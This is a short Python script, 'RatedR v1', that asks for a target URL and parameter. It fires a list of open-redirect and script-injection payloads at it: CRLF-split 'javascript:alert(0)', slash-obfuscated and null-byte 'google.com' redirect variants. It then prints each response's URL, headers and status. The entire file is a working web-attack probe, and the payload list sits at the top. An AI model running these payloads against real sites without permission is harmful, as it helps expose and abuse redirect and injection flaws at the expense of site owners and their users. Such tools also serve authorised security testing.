import requests
payloads = [r"java%0d%0ascript%0d%0a:alert(0)",
            r"//google.com",
            r"https:google.com",
            r"//google%E3%80%82com",
            r"\/\/google.com/",
            r"/\/google.com/",
            r"//google%00.com",
            r"http://google.com/"]

print("RatedR v1 @B3nac")
print("================")
print("Type in url and parameter being tested. Ex. www.google.com/r=")

url = input("http://"+'')

for payload in payloads:
    try:
        r = requests.get(("http://"+url+payload))
        print("\n")
        print("URL:", r.url,"\n")
        print("Headers:", r.headers, "\n")
        print("Status:", r.status_code, "\n")
        print("=======================================================")
   # except requests.Timeout:
    #    print("Timeout!")
    except requests.exceptions.ConnectionError:
        print("An exception occured!")
    except requests.exceptions.MissingSchema:
        print("Missing Schema!")

